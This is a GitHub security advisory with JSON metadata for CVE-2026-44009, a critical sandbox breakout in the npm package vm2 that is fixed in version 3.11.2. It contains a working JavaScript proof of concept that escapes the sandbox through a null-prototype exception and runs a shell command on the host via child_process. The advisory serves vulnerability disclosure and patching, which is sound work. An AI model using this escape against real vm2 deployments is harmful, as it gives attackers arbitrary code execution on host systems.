VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

In `handleException` due to ``// SECURITY (post-GHSA-mpf8 hardening): use `from` (not `ensureThis`)`` exceptions with a null proto will be assumed to come from the other side and being proxied. Therefore, it is possible to get the proxied and unproxied object of a sandbox object with a null proto when thrown and then catched which allows to get the host `Function` object.

### PoC

```js
const {VM} = require("vm2");
const vm = new VM();
console.log(vm.run(`
const o = {__proto__: null};
try {
	throw o;
} catch (e) {
	e.f = Buffer.prototype.inspect
	o.f.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');
}
`));
```

### Impact

Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.", "epss": {"percentage": 0.00812, "percentile": 0.525}, "ghsa_id": "GHSA-9vg3-4rfj-wgcm", "github_reviewed_at": "2026-05-08T16:20:58Z", "html_url": "https://github.com/advisories/GHSA-9vg3-4rfj-wgcm", "identifiers": [{"type": "GHSA", "value": "GHSA-9vg3-4rfj-wgcm"}, {"type": "CVE", "value": "CVE-2026-44009"}], "nvd_published_at": "2026-05-13T18:16:17Z", "published_at": "2026-05-08T16:20:58Z", "references": ["https://github.com/patriksimek/vm2/security/advisories/GHSA-9vg3-4rfj-wgcm", "https://github.com/patriksimek/vm2/releases/tag/v3.11.2", "https://nvd.nist.gov/vuln/detail/CVE-2026-44009", "https://github.com/advisories/GHSA-9vg3-4rfj-wgcm"], "repository_advisory_url": "https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-9vg3-4rfj-wgcm", "severity": "critical", "source_code_location": "https://github.com/patriksimek/vm2", "summary": "vm2 has Sandbox Breakout Through Null Proto Exception", "type": "reviewed", "updated_at": "2026-05-14T20:37:14Z", "url": "https://api.github.com/advisories/GHSA-9vg3-4rfj-wgcm", "vulnerabilities": [{"first_patched_version": "3.11.2", "package": {"ecosystem": "npm", "name": "vm2"}, "vulnerable_functions": [], "vulnerable_version_range": "< 3.11.2"}], "withdrawn_at": null}
